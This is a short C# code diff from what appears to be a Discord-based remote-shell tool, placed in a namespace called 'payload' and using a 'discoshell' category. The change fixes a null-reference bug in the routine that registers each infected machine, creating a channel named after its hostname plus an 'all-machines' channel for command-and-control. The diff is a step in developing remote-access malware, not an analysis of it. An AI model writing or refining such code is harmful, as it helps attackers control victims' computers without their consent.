@@ -70,10 +70,11 @@ namespace payload
             foreach (SocketGuild g in client.Guilds)
             {
                 SocketCategoryChannel category = g.CategoryChannels.SingleOrDefault(x => x.Name == "discoshell");
-                ulong categoryid = category.Id;
+                ulong categoryid;
                 if (category == null) categoryid = (await g.CreateCategoryChannelAsync("discoshell")).Id;
-                if (category.Channels.SingleOrDefault(x => x.Name == Environment.MachineName.ToLower()) == null) await g.CreateTextChannelAsync(Environment.MachineName.ToLower(), prop => prop.CategoryId = categoryid);
-                if (category.Channels.SingleOrDefault(x => x.Name == "all-machines") == null) await g.CreateTextChannelAsync("all-machines", prop => prop.CategoryId = categoryid);
+                else categoryid = category.Id;
+                if (g.Channels.SingleOrDefault(x => x.Name == Environment.MachineName.ToLower()) == null) await g.CreateTextChannelAsync(Environment.MachineName.ToLower(), prop => prop.CategoryId = categoryid);
+                if (g.Channels.SingleOrDefault(x => x.Name == "all-machines") == null) await g.CreateTextChannelAsync("all-machines", prop => prop.CategoryId = categoryid);
             }
         }
 
